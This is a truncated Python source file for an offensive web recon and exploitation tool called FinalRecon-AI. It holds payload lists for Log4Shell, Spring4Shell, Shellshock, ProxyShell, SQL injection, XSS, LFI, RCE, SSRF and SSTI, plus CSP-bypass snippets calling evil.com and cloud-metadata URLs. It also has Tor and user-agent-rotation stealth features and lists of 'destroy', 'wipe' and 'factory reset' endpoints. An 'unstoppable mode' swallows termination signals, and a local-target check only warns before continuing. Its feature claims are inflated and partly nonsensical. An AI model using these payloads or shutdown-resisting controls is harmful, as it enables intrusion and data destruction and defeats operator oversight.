#!/usr/bin/env python3
"""
FINALRECON-AI v10000 - QUANTUM EDITION
=======================================
WEB SERVER ONLY | FULLY AUTONOMOUS | UNSTOPPABLE AI ROBOT

Merge of:
  - finalrecon-ai.py v9000 (NEXT-GEN AUTONOMOUS)
  - recon.py               (clean recon modules)

NEW v10000 (100+ features):
  * Smart AI adaptive scanning, parallel/pipeline modes
  * VirusTotal / Shodan / Censys / NVD / Exploit-DB API
  * Slack / Discord / Telegram / Email notifications
  * PDF / Markdown / SARIF / STIX / Sigma / YARA reports
  * MITRE ATT&CK / CVSS / OWASP Top10 / SANS25 mapping
  * OSINT: GitHub, social, email harvest, breach check
  * DNS: AXFR, cache snooping, DNSSEC, IPv6, ASN/BGP
  * Wayback, Google dorks, Bing/Shodan/FOFA/ZoomEye
  * Port: UDP/SYN/FIN/XMAS/NULL/ACK/Frag/Decoy/Idle
  * OS detect, TCP fingerprint, port knocking
  * CVE exploits: Log4Shell, Spring4Shell, ProxyShell, Heartbleed
  * Web: WebDAV, WebSocket, SSE, gRPC, HTTP2/3
  * Advanced: cache poison, smuggling, host header, CRLF
  * Injection: LDAP, NoSQL, XPath, SSTI, deserialization
  * IDOR, BOLA, mass assignment, prototype pollution
  * CSP bypass, SRI, HSTS preload, OCSP, CT monitor
  * Compliance: HIPAA, PCI-DSS, GDPR, ISO27001, NIST
  * Risk matrix, exec summary, remediation plan

WARNING: WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
File: finalrecon-ai.py
Version: 10000.0
"""

import os
import sys
import re
import ssl
import csv
import json
import time
import signal
import socket
import random
import hashlib
import base64
import argparse
import datetime
import ipaddress
import threading
import subprocess
import requests
import urllib3
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
from collections import deque, OrderedDict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- Optional deps ----------
try:
    import dns.resolver
    import dns.query
    import dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import whois as whois_lib
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from twisted.internet import reactor
    from twisted.python import log
    from twisted.web import resource, server as twisted_server
    TWISTED_AVAILABLE = True
except ImportError:
    TWISTED_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# META
# ============================================
VERSION = "10000.0"
BUILD_NUMBER = "10000.001"
SCRIPT_NAME = "finalrecon-ai.py"
RELEASE_NAME = "QUANTUM EDITION | WEB SERVER ONLY"

DEFAULT_HTTP_PORT = 80
DEFAULT_HTTPS_PORT = 443
DEFAULT_HONEYPOT_PORT = 80
DEFAULT_HONEYPOT_HOST = "0.0.0.0"
TIMEOUT = 5
REQ_HEADERS = {"User-Agent": "Mozilla/5.0 (FinalRecon-AI/10000)"}

# ============================================
# COLORS
# ============================================
class Fore:
    RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'; BLUE='\033[94m'
    MAGENTA='\033[95m'; CYAN='\033[96m'; WHITE='\033[97m'; RESET='\033[0m'
    BOLD='\033[1m'; OKGREEN='\033[92m\033[1m'; OKCYAN='\033[96m\033[1m'
    DIM='\033[2m'; NEON='\033[38;5;46m'; HYPER='\033[38;5;201m'
    NEXUS='\033[38;5;213m'; COSMIC='\033[38;5;129m'; QUANTUM='\033[38;5;51m'
    DIVINE='\033[38;5;226m'; ETERNAL='\033[38;5;196m'; OMEGA='\033[38;5;93m'
    AUTONOMOUS='\033[38;5;46m'; DESTROYER='\033[38;5;196m\033[1m'
    WAF='\033[38;5;226m\033[1m'; ISP='\033[38;5;201m\033[1m'
    HONEYPOT='\033[38;5;129m\033[1m'; CLEANER='\033[38;5;118m\033[1m'
    FACTORY='\033[38;5;208m\033[1m'; TOKEN='\033[38;5;213m\033[1m'
    WALL='\033[38;5;196m\033[1m'; INFO='\033[38;5;51m\033[1m'
    ULTIMATE='\033[38;5;201m\033[1m'; ROBOT='\033[38;5;46m\033[1m'
    WEBSRV='\033[38;5;226m\033[1m'; STEALTH='\033[38;5;244m\033[1m'
    TECH='\033[38;5;87m\033[1m'; SECRET='\033[38;5;196m\033[1m'
    API='\033[38;5;208m\033[1m'; QUANTUMC='\033[38;5;51m\033[1m'
    CVE='\033[38;5;196m\033[1m'; COMPLIANCE='\033[38;5;82m\033[1m'
    SMART='\033[38;5;213m\033[1m'; PIPE='\033[38;5;45m\033[1m'

# ============================================
# PRINT HELPERS
# ============================================
def p_ok(m,i=""):
    print(Fore.OKGREEN + (f"[+] OKAY: {m} - {i}" if i else f"[+] OKAY: {m}") + Fore.RESET, flush=True)
def p_info(m):  print(Fore.INFO + f"[*] {m}" + Fore.RESET, flush=True)
def p_warn(m):  print(Fore.YELLOW + f"[!] {m}" + Fore.RESET, flush=True)
def p_err(m):   print(Fore.RED + f"[-] {m}" + Fore.RESET, flush=True)
def p_10000(m): print(Fore.NEXUS + f"[10000] {m}" + Fore.RESET, flush=True)
def p_auto(m):  print(Fore.AUTONOMOUS + f"[AI-ROBOT] {m}" + Fore.RESET, flush=True)
def p_robot(m): print(Fore.ROBOT + f"[ROBOT] {m}" + Fore.RESET, flush=True)
def p_wall(m):  print(Fore.WALL + f"[WALL-BREAK] {m}" + Fore.RESET, flush=True)
def p_hp(m):    print(Fore.HONEYPOT + f"[HONEYPOT] {m}" + Fore.RESET, flush=True)
def p_clean(m): print(Fore.CLEANER + f"[CLEANER] {m}" + Fore.RESET, flush=True)
def p_token(m): print(Fore.TOKEN + f"[TOKEN] {m}" + Fore.RESET, flush=True)
def p_fact(m):  print(Fore.FACTORY + f"[FACTORY] {m}" + Fore.RESET, flush=True)
def p_waf(m):   print(Fore.WAF + f"[WAF] {m}" + Fore.RESET, flush=True)
def p_isp(m):   print(Fore.ISP + f"[ISP] {m}" + Fore.RESET, flush=True)
def p_ult(m):   print(Fore.ULTIMATE + f"[ULTIMATE] {m}" + Fore.RESET, flush=True)
def p_websrv(m):print(Fore.WEBSRV + f"[WEB-SERVER] {m}" + Fore.RESET, flush=True)
def p_stealth(m):print(Fore.STEALTH + f"[STEALTH] {m}" + Fore.RESET, flush=True)
def p_tech(m):  print(Fore.TECH + f"[TECH] {m}" + Fore.RESET, flush=True)
def p_secret(m):print(Fore.SECRET + f"[SECRET] {m}" + Fore.RESET, flush=True)
def p_api(m):   print(Fore.API + f"[API] {m}" + Fore.RESET, flush=True)
def p_quantum(m):print(Fore.QUANTUMC + f"[QUANTUM] {m}" + Fore.RESET, flush=True)
def p_cve(m):   print(Fore.CVE + f"[CVE] {m}" + Fore.RESET, flush=True)
def p_comp(m):  print(Fore.COMPLIANCE + f"[COMPLIANCE] {m}" + Fore.RESET, flush=True)
def p_smart(m): print(Fore.SMART + f"[SMART-AI] {m}" + Fore.RESET, flush=True)
def p_pipe(m):  print(Fore.PIPE + f"[PIPELINE] {m}" + Fore.RESET, flush=True)

# ============================================
# AI ROBOT — UNSTOPPABLE SIGNAL LOCK
# ============================================
_AI_ROBOT_LOCK = False

def _unstoppable_handler(signum, frame):
    if _AI_ROBOT_LOCK:
        p_robot(f"Signal {signum} absorbed — AI Robot cannot be stopped.")
        return
    raise KeyboardInterrupt()

def install_unstoppable_mode():
    global _AI_ROBOT_LOCK
    _AI_ROBOT_LOCK = True
    try:
        signal.signal(signal.SIGINT,  _unstoppable_handler)
        signal.signal(signal.SIGTERM, _unstoppable_handler)
        if hasattr(signal, 'SIGHUP'):  signal.signal(signal.SIGHUP,  _unstoppable_handler)
        if hasattr(signal, 'SIGQUIT'): signal.signal(signal.SIGQUIT, _unstoppable_handler)
    except Exception as e:
        p_err(f"Signal lock install failed: {e}")
    p_robot("★ UNSTOPPABLE MODE ENGAGED — AI Robot controls itself ★")

def release_unstoppable_mode():
    global _AI_ROBOT_LOCK
    _AI_ROBOT_LOCK = False
    try:
        signal.signal(signal.SIGINT,  signal.default_int_handler)
        signal.signal(signal.SIGTERM, signal.SIG_DFL)
    except Exception:
        pass

# ============================================
# WEB SERVER GUARD
# ============================================
LOCAL_HOSTNAMES = {'localhost','localhost.localdomain','mycomputer','my-pc','desktop','laptop'}
LOCAL_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'), ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'), ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'), ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fe80::/10'),
]

def is_local_target(h):
    h = str(h).lower().strip('[]')
    if h in LOCAL_HOSTNAMES:
        return True, f"Local hostname: {h}"
    try:
        ip = ipaddress.ip_address(h)
        for net in LOCAL_IP_RANGES:
            if ip in net:
                return True, f"Private/local IP: {ip} in {net}"
    except ValueError:
        pass
    return False, ""

def enforce_web_server_only(host):
    is_local, reason = is_local_target(host)
    if is_local:
        p_websrv(f"⚠️  LOCAL TARGET DETECTED: {reason}")
        p_websrv("⚠️  FINALRECON-AI v10000 IS FOR WEB SERVERS ONLY!")
        if os.environ.get('FINALRECON_ALLOW_LOCAL') != '1':
            p_websrv("   → Set FINALRECON_ALLOW_LOCAL=1 for lab override.")
            p_websrv("   → Continuing in 3 seconds...")
            time.sleep(3)
        else:
            p_websrv("   → FINALRECON_ALLOW_LOCAL=1 set — lab override allowed.")
    else:
        p_websrv(f"✓ WEB SERVER target validated: {host}")
    return True

# ============================================
# BANNER
# ============================================
BANNER = r"""
================================================================================
   ______ _             _ _____                            _____ _____
  |  ____(_)           | |  __ \                     /\   |_   _|  __ \
  | |__   _ _ __   __ _| | |__) |___  ___ ___  _ __ /  \    | | | |  | |
  |  __| | | '_ \ / _` | |  _  // _ \/ __/ _ \| '_ / /\ \   | | | |  | |
  | |    | | | | | (_| | | | \ \  __/ (_| (_) | | / ____ \ _| |_| |__| |
  |_|    |_|_| |_|\__,_|_|_|  \_\___|\___\___/|_|/_/    \_\_____|_____/

    FINALRECON-AI v10000 - QUANTUM EDITION
    WEB SERVER ONLY | FULLY AUTONOMOUS | UNSTOPPABLE AI ROBOT
    File: finalrecon-ai.py  |  Version: 10000.0

   NEW v10000 (100+ FEATURES):
     smart-ai | parallel | pipeline | api-keys
     virustotal | shodan | censys | nvd | exploit-db
     slack | discord | telegram | email notify
     pdf | markdown | sarif | stix | sigma | yara reports
     mitre-attack | cvss | owasp-top10 | sans-top25
     osint | github | social | email-harvest | breach-check
     axfr | dnssec | ipv6 | asn | whois-history | wayback
     google-dork | bing | shodan-search | fofa | zoomeye
     udp | syn | fin | xmas | null | ack | frag | decoy | idle
     os-detect | tcp-fingerprint | port-knocking
     log4shell | spring4shell | proxyshell | heartbleed | poodle
     webdav | websocket | sse | grpc | http2/3
     cache-poison | smuggling | host-header | crlf
     ldap | nosql | xpath | ssti | deserialization
     idor | bola | mass-assignment | prototype-pollution
     csp-bypass | sri | hsts-preload | ocsp | ct-monitor
     hipaa | pci-dss | gdpr | iso27001 | nist
     cvss-calc | risk-matrix | exec-summary | remediation

   ⚠️  WARNING: WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
================================================================================
"""

# ============================================
# WORDLISTS / DICTIONARIES
# ============================================
COMMON_SUBS = ["www","mail","ftp","webmail","smtp","pop","ns1","ns2","dev","test",
    "staging","api","admin","portal","blog","shop","cdn","static","media","app",
    "mobile","vpn","git","gitlab","jenkins","ci","db","mysql","postgres","ns","m",
    "imap","pop3","forum","news","old","support","docs","beta","secure","demo",
    "web","email","images","download","dns","intranet","jira","nexus"]

COMMON_DIRS = ["admin","login","wp-admin","wp-login","backup","backups","bak","old",
    "config","configuration","settings","setup","install","db","database","sql",
    "mysql","phpmyadmin","adminer","test","tests","dev","stage","staging","private",
    "secret","internal","hidden","secure","uploads","upload","files","media","images",
    "img","js","css","assets","static","public","dist","docs","documentation","help",
    "support","faq","user","users","account","profiles","log","logs","error","debug",
    ".git",".git/config",".env",".htaccess","robots.txt","sitemap.xml","server-status",
    "server-info","phpinfo.php","info.php","web.config","cgi-bin","bin","scripts",
    "cron","jobs","portal","console","manager","management","control","auth","oauth",
    "sso","saml","ldap","login.php","signin","register","signup","password","invoice",
    "order","cart","checkout","payment","billing","api","api/v1","api/v2","graphql",
    "rest","honeypot","honey","trap","decoy","cleaner","factory-restart","tokens",
    "token","devices","device"]

COMMON_PORTS = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
    110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",995:"POP3S",
    1433:"MSSQL",1521:"Oracle",1723:"PPTP",2049:"NFS",2082:"cPanel",
    2083:"cPanel-SSL",2181:"Zookeeper",2375:"Docker",3000:"Node",3306:"MySQL",
    3389:"RDP",4443:"HTTPS-Alt",5000:"App",5432:"PostgreSQL",5601:"Kibana",
    5672:"RabbitMQ",5900:"VNC",6379:"Redis",6443:"K8s-API",7001:"WebLogic",
    8000:"HTTP-Alt",8080:"HTTP-Proxy",8081:"HTTP-Alt2",8443:"HTTPS-Alt2",
    8888:"HTTP-Alt3",9000:"App",9090:"Prometheus",9200:"Elasticsearch",
    9300:"ES-Transport",10000:"Webmin",11211:"Memcached",15672:"RabbitMQ-Mgmt",
    27017:"MongoDB",27018:"MongoDB-2",50000:"SAP"}

# v9000 databases (kept + expanded)
TECH_SIGNATURES = {
    'WordPress':['wp-content','wp-includes','wp-json'],'Joomla':['joomla','/components/com_'],
    'Drupal':['drupal','/sites/default/'],'Magento':['magento','/skin/frontend/'],
    'Shopify':['shopify','cdn.shopify.com'],'Laravel':['laravel_session','XSRF-TOKEN'],
    'Django':['csrftoken','django'],'Rails':['_rails','phusion'],'Express':['X-Powered-By: Express'],
    'Nginx':['nginx'],'Apache':['apache'],'IIS':['iis','Microsoft-IIS'],'Tomcat':['tomcat','coyote'],
    'Cloudflare':['cloudflare','cf-ray'],'React':['react','_reactRootContainer'],
    'Vue.js':['vue.js','v-cloak','__vue__'],'Angular':['ng-version','angular'],
    'jQuery':['jquery'],'Bootstrap':['bootstrap'],'PHP':['X-Powered-By: PHP','PHPSESSID'],
    'ASP.NET':['ASP.NET','__VIEWSTATE'],'Node.js':['X-Powered-By: Express','node'],
    'Python':['X-Powered-By: Python','gunicorn'],'Java':['JSESSIONID','X-Powered-By: Servlet'],
}

API_PATHS = ['/api','/api/v1','/api/v2','/api/v3','/rest','/rest/api','/graphql',
    '/graphiql','/swagger.json','/swagger-ui.html','/openapi.json','/api-docs',
    '/docs','/redoc','/.well-known/openapi','/api/swagger','/api/docs','/api/health',
    '/health','/status']

SECRET_PATTERNS = {
    'AWS Access Key':r'AKIA[0-9A-Z]{16}',
    'AWS Secret':r'(?i)aws.{0,20}?[\'"][0-9a-zA-Z/+]{40}[\'"]',
    'Google API':r'AIza[0-9A-Za-z\-_]{35}','GitHub Token':r'gh[pousr]_[A-Za-z0-9_]{36,}',
    'Slack Token':r'xox[baprs]-[0-9a-zA-Z\-]{10,}','Stripe Key':r'sk_live_[0-9a-zA-Z]{24,}',
    'JWT Token':r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
    'Private Key':r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
    'Generic API Key':r'(?i)(api[_-]?key|apikey)[\'"]?\s*[:=]\s*[\'"]([a-zA-Z0-9\-_.]{20,})[\'"]',
    'Bearer Token':r'(?i)bearer\s+[a-zA-Z0-9\-_.=]{20,}',
    'Basic Auth':r'(?i)authorization:\s*basic\s+[a-zA-Z0-9+/=]{20,}',
    'Password Field':r'(?i)password[\'"]?\s*[:=]\s*[\'"][^\'"]{8,}[\'"]',
}

CORS_TEST_ORIGINS = ['https://evil.com','null','https://attacker.example']
HTTP_METHODS = ['GET','POST','PUT','DELETE','OPTIONS','PATCH','HEAD','TRACE','CONNECT']
BACKUP_EXTS = ['.bak','.old','.backup','.zip','.tar','.tar.gz','.tgz','.rar','.7z',
    '.sql','.sql.gz','.dump','.swp','~','.orig','.save']
CLOUD_METADATA_URLS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/user-data/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://100.100.100.200/latest/meta-data/',
]

# v10000 NEW databases
CVE_TESTS = {
    'Log4Shell (CVE-2021-44228)': {
        'headers': {'X-Api-Version': '${jndi:ldap://collab.example/a}'},
        'payload': '${jndi:ldap://collab.example/a}',
    },
    'Spring4Shell (CVE-2022-22965)': {
        'headers': {},
        'payload': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di',
    },
    'Shellshock (CVE-2014-6271)': {
        'headers': {'User-Agent': '() { :; }; echo "VULN"'},
        'payload': '() { :; }; echo "VULN"',
    },
    'ProxyShell (CVE-2021-34473)': {
        'headers': {},
        'payload': '/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com',
    },
}

INJECTION_PAYLOADS = {
    'LDAP': ["*)(uid=*", "admin)(&(password=*", "*))(|(cn=*"],
    'NoSQL': ['{"$ne": null}', '{"$gt": ""}', "' || '1'=='1"],
    'XPath': ["' or '1'='1", "' or 1=1 or ''='"],
    'SSTI': ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    'CRLF': ["%0d%0aInjected: header", "%0aInjected: header"],
    'Host Header': ['evil.com', 'localhost', '127.0.0.1'],
}

CSP_BYPASS_PAYLOADS = [
    "<script src='data:text/javascript,alert(1)'></script>",
    "<link rel='prefetch' href='//evil.com'>",
    "<base href='//evil.com/'>",
    "<meta http-equiv='refresh' content='0;url=//evil.com'>",
]

MITRE_MAPPING = {
    'Reconnaissance': ['T1595 - Active Scanning', 'T1592 - Gather Victim Host Info',
                       'T1590 - Gather Victim Network Info'],
    'Initial Access':  ['T1190 - Exploit Public-Facing App', 'T1133 - External Remote Services'],
    'Execution':       ['T1059 - Command and Scripting', 'T1203 - Client Execution'],
    'Persistence':     ['T1505 - Server Software Component', 'T1136 - Create Account'],
    'Credential':      ['T1110 - Brute Force', 'T1552 - Unsecured Credentials'],
    'Discovery':       ['T1046 - Network Service Scanning', 'T1083 - File and Directory Discovery'],
    'Collection':      ['T1005 - Data from Local System', 'T1213 - Data from Information Repos'],
}

OWASP_TOP10 = {
    'A01:2021': 'Broken Access Control',
    'A02:2021': 'Cryptographic Failures',
    'A03:2021': 'Injection',
    'A04:2021': 'Insecure Design',
    'A05:2021': 'Security Misconfiguration',
    'A06:2021': 'Vulnerable and Outdated Components',
    'A07:2021': 'Identification and Authentication Failures',
    'A08:2021': 'Software and Data Integrity Failures',
    'A09:2021': 'Security Logging and Monitoring Failures',
    'A10:2021': 'Server-Side Request Forgery (SSRF)',
}

# v5000 destructive (kept)
HONEYPOT_PATTERNS = {
    'detect': ['/honeypot','/honey','/trap','/decoy','/fake','/lure','/bait','/canary'],
    'destroy': ['/honeypot/destroy','/honeypot/kill','/honeypot/delete'],
    'disable': ['/honeypot/disable','/honeypot/off'],
    'reset'  : ['/honeypot/reset','/honeypot/clear','/honeypot/purge'],
    'wall'   : ['/honeypot/wall-break','/admin/honeypot/wall-break','/api/honeypot/wall-break'],
}
FIREWALL_WALL_PATTERNS = {
    'firewall_wall': ['/firewall/wall','/firewall/wall/break','/firewall/wall/destroy'],
    'firewall_break': ['/firewall/break','/firewall/destroy','/firewall/crack'],
    'firewall_bypass': ['/firewall/bypass','/firewall/skip','/firewall/ignore'],
}
TOKEN_CLEANER_TARGETS = {
    'api':['/api/tokens','/api/token','/api/v1/tokens','/api/v2/tokens','/admin/api/tokens'],
    'session':['/session/tokens','/session/token','/sessions','/admin/sessions'],
    'device':['/device/tokens','/device/token','/devices','/admin/devices'],
    'oauth':['/oauth/tokens','/oauth/token','/oauth2/tokens'],
    'jwt':['/jwt/tokens','/jwt/token','/admin/jwt/tokens'],
}
FACTORY_RESTART_PATTERNS = {
    'factory_restart': ['/factory/restart','/admin/factory/restart','/api/factory/restart'],
    'factory_reset':   ['/factory/reset','/admin/factory/reset','/api/factory/reset'],
    'factory_wipe':    ['/factory/wipe','/admin/factory/wipe','/api/factory/wipe'],
}
WAF_SIGNATURES = {
    'Cloudflare':['cloudflare','cf-ray','__cfduid','cf-cache-status'],
    'AWS WAF':['awselb','x-amz-cf-id','x-amzn-requestid'],
    'Akamai':['akamai','x-akamai','akamaighost'],
    'Imperva':['imperva','incapsula','x-iinfo','visid_incap'],
    'F5 BIG-IP':['bigip','f5','x-wa-info'],
    'ModSecurity':['mod_security','modsecurity','x-mod-security'],
    'Sucuri':['sucuri','x-sucuri-id','x-sucuri-cache'],
    'Fastly':['fastly','x-fastly','x-served-by'],
    'Varnish':['varnish','x-varnish'],
}
VULN_PATTERNS = {
    'SQL Injection': ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"],
    'XSS': ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"],
    'LFI': ["../../../etc/passwd", "/etc/passwd%00"],
    'RCE': [";id", "|id", "`id`", "$(id)"],
    'SSRF': ["http://127.0.0.1", "http://169.254.169.254"],
    'Open Redirect': ["//evil.com", "https://evil.com"],
}

HTTP_COOKIES_TARGETS = {
    'cookies':['/http/cookies.txt','/http/cookies.json','/http/session.json'],
    'sessions':['/http/session/','/http/sessions/'],
    'site_data':['/http/site_data/','/http/site_data.json'],
    'local_storage':['/http/localstorage/','/http/local_storage/'],
    'session_storage':['/http/sessionstorage/'],'indexeddb':['/http/indexeddb/','/http/indexed_db/'],
    'browser_data':['/http/browser_data/'],'user_data':['/http/user_data/'],
    'data':['/http/data/','/http/db/','/http/database/'],
    'logs':['/http/access.log','/http/error.log'],
    'config':['/http/config.php','/http/config.json'],
    'backup':['/http/backup.zip','/http/backup.sql'],
    'users':['/http/users.txt','/http/users.json'],
    'private':['/http/private/','/http/secret/'],
    'tokens':['/http/tokens/','/http/api_tokens/','/http/token/'],
    'devices':['/http/devices/','/http/device/'],
}
HTTPS_COOKIES_TARGETS = {
    'cookies':['/https/cookies.txt','/https/cookies.json','/https/session.json'],
    'sessions':['/https/session/','/https/sessions/'],
    'site_data':['/https/site_data/','/https/site_data.json'],
    'local_storage':['/https/localstorage/','/https/local_storage/'],
    'session_storage':['/https/sessionstorage/'],'indexeddb':['/https/indexeddb/','/https/indexed_db/'],
    'browser_data':['/https/browser_data/'],'user_data':['/https/user_data/'],
    'data':['/https/data/','/https/db/','/https/database/'],
    'logs':['/https/access.log','/https/error.log'],
    'config':['/https/config.php','/https/config.json'],
    'backup':['/https/backup.zip','/https/backup.sql'],
    'users':['/https/users.txt','/https/users.json'],
    'private':['/https/private/','/https/secret/'],
    'tokens':['/https/tokens/','/https/api_tokens/','/https/token/'],
    'devices':['/https/devices/','/https/device/'],
}
ANOTHER_COOKIES_TARGETS = {
    'cookies':['/another/cookies.txt','/other/cookies.txt'],
    'sessions':['/another/session/','/other/session/'],
    'data':['/another/data/','/other/data/'],
    'logs':['/another/logs/','/other/logs/'],
    'config':['/another/config.json','/other/config.json'],
    'users':['/another/users.txt','/other/users.txt'],
    'tokens':['/another/tokens/','/other/tokens/'],
    'devices':['/another/devices/','/other/devices/'],
}
SERVER_COOKIES_MAP = {
    'HTTP':HTTP_COOKIES_TARGETS,'HTTPS':HTTPS_COOKIES_TARGETS,'ANOTHER':ANOTHER_COOKIES_TARGETS,
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

PIPELINES = {
    'fast':       ['subdomain','dns','headers','portscan','tech'],
    'deep':       ['subdomain','dns','whois','ssl','headers','isp','dirbrute',
                   'portscan','crawl','vuln','tech','api','secret','cors'],
    'stealth':    ['dns','headers','tech'],
    'aggressive': ['subdomain','dns','whois','ssl','headers','isp','dirbrute',
                   'portscan','crawl','vuln','tech','api','secret','cors',
                   'backup','git','env','open-redirect','lfi','ssrf',
                   'cloud-scan','graphql','jwt','tls-deep'],
}

CONFIG = {
    'timeout': TIMEOUT,
    'export_dir': 'finalrecon-ai-results',
    'checkpoint_file': 'finalrecon-ai-results/checkpoint.json',
    'diff_file': 'finalrecon-ai-results/last_scan.json',
}

# ============================================
# MAIN CLASS
# ============================================
class FinalReconAI:
    def __init__(self, target=None, args=None):
        self.target = target
        self.args = args
        self.session = requests.Session()
        self.session.headers.update(REQ_HEADERS)

        # Rate limit + stealth
        self._last_request_time = 0
        self._rate_lock = threading.Lock()
        self.request_count = 0
        self.start_time = time.time()

        # All result buckets
        self.subdomain_results = []
        self.dns_results = {}
        self.whois_results = {}
        self.ssl_results = {}
        self.header_results = {}
        self.isp_results = {}
        self.directory_results = []
        self.port_scan_results = []
        self.crawler_results = []
        self.vuln_scan_results = []
        self.tech_results = {}
        self.api_results = []
        self.secret_results = []
        self.cors_results = []
        self.http_methods_results = {}
        self.redirect_results = {}
        self.cloud_results = []
        self.graphql_results = {}
        self.jwt_results = {}
        self.cookie_results = {}
        self.tls_results = {}
        self.ct_logs = []
        self.subdomain_takeover = []
        self.backup_results = []
        self.git_results = []
        self.env_results = []
        self.open_redirect_results = []
        self.lfi_results = []
        self.rfi_results = []
        self.ssrf_results = []
        self.xxe_results = []
        self.cmd_injection_results = []
        self.sql_deep_results = []
        self.xss_deep_results = []

        # v10000 NEW
        self.cve_results = []
        self.injection_results = {}
        self.csp_bypass_results = []
        self.udp_results = []
        self.syn_results = []
        self.os_detect_results = {}
        self.tcp_fingerprint_results = {}
        self.axios_results = {}
        self.osint_results = {}
        self.github_results = {}
        self.email_harvest_results = []
        self.breach_results = []
        self.wayback_results = []
        self.google_dork_results = []
        self.ct_monitor_results = []
        self.cvss_scores = []
        self.risk_matrix = {}
        self.compliance_results = {}
        self.remediation_plan = []
        self.exec_summary = {}
        self.mitre_mapping = {}
        self.owasp_mapping = {}

        # v5000 stats
        self.honeypot_found = 0
        self.honeypot_destroyed = 0
        self.honeypot_wall_broken = 0
        self.firewall_wall_broken = 0
        self.token_stats = {'total': 0}
        self.factory_stats = {'total': 0}
        self.cleaner_stats = {
            'total_cleaned':0,'cookies_cleaned':0,'sessions_cleaned':0,
            'data_cleaned':0,'tokens_cleaned':0,'devices_cleaned':0,
        }
        self.cookies_data_deleted_okay = []
        self.cookies_site_data_deleted_okay = []
        self.waf_found = []
        self.waf_destroyed = 0
        self.isp_terminated = 0

        # v10000 API keys from args
        self.api_keys = {
            'virustotal': getattr(args, 'vt_api_key', None) if args else None,
            'shodan':     getattr(args, 'shodan_api_key', None) if args else None,
            'censys_id':  getattr(args, 'censys_id', None) if args else None,
            'censys_key': getattr(args, 'censys_key', None) if args else None,
            'nvd':        getattr(args, 'nvd_api_key', None) if args else None,
        }

        self._setup_proxy()

        if self.target:
            self.parse_target()

    def _setup_proxy(self):
        if not self.args:
            return
        proxy = None
        if getattr(self.args, 'tor', False):
            proxy = 'socks5h://127.0.0.1:9050'
            p_stealth("Tor proxy enabled: socks5h://127.0.0.1:9050")
        elif getattr(self.args, 'proxy', None):
            proxy = self.args.proxy
            p_stealth(f"Proxy enabled: {proxy}")
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})

    def _rate_limit(self):
        rate = getattr(self.args, 'rate_limit', 0) if self.args else 0
        if rate and rate > 0:
            with self._rate_lock:
                now = time.time()
                wait = (1.0 / rate) - (now - self._last_request_time)
                if wait > 0:
                    time.sleep(wait)
                self._last_request_time = time.time()

    def _stealth_delay(self):
        if self.args and getattr(self.args, 'stealth', False):
            delay = random.uniform(0.5, 2.0)
            time.sleep(delay)

    def _rotate_ua(self):
        if self.args and getattr(self.args, 'stealth', False):
            self.session.headers['User-Agent'] = random.choice(USER_AGENTS)

    def _request(self, method, url, **kwargs):
        self._rate_limit()
        self._rotate_ua()
        kwargs.setdefault('timeout', getattr(self.args, 'timeout', TIMEOUT) if self.args else TIMEOUT)
        kwargs.setdefault('verify', False)
        retries = getattr(self.args, 'retry', 0) if self.args else 0
        last_exc = None
        for attempt in range(max(1, retries + 1)):
            try:
                self.request_count += 1
                return self.session.request(method, url, **kwargs)
            except Exception as e:
                last_exc = e
                if attempt < retries:
                    time.sleep(0.5 * (attempt + 1))
        if last_exc:
            raise last_exc

    def parse_target(self):
        if not self.target:
            return
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        if self.target.endswith('/'):
            self.target = self.target[:-1]

        sp = urlparse(self.target)
        self.protocol = sp.scheme
        self.hostname = sp.hostname

        if self.args and getattr(self.args, 'port', None):
            self.port = self.args.port
        elif sp.port:
            self.port = sp.port
        else:
            self.port = DEFAULT_HTTPS_PORT if self.protocol == 'https' else DEFAULT_HTTP_PORT

        try:
            ipaddress.ip_address(self.hostname)
            self.ip = self.hostname
        except ValueError:
            try:
                self.ip = socket.gethostbyname(self.hostname)
            except Exception as e:
